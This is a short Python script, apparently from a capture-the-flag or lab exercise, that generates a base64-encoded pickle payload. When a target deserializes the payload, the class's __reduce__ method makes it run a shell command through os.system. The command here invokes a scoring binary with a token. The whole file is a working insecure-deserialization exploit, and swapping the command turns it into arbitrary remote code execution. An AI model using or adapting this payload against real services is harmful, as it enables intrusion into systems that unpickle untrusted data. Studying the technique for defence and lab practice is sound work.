import pickle
import os
import base64

#Python3
class RCE(object):
    def __reduce__(self):
        command = "/usr/local/bin/score 2737b949-b896-46ef-92b8-58418a763023" #Command to execute
        return os.system, (command,)

if __name__ == '__main__':
    a = RCE()
    pickled = pickle.dumps(a)
    print(base64.urlsafe_b64encode(pickled))


